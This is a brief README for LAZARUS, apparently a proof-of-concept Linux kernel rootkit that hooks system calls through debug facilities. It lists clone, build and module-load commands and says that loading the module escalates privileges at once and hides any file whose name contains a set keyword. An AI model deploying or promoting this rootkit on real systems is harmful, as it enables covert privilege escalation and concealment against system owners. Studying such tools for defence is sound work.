						 _____________________

								LAZARUS

						  Claudio Migliorelli
						 _____________________


Table of Contents
_________________

1. Installation and usage
2. Usage


LAZARUS is a rootkit for Linux Kernels from 5.4.0-70 to 5.6.x that uses
debug facilities to hook transparently system calls.


1 Installation and usage
========================

  Usage:
  ,----
  | git clone https://github.com/migliio/LAZARUS.git
  | cd LAZARUS
  | make
  | make load
  `----
  Proof of concept:
  ,----
  | cd ./user/
  | ./user.sh
  `----


2 Usage
=======

  To hide files, once the module is loaded, create them with
  `lzrs_keyword' inside the files' name. After `make load', /system
  escalation/ is done immediately. A proof of concept could be done
  execunting the script `user.sh' under the `./user/' directory.
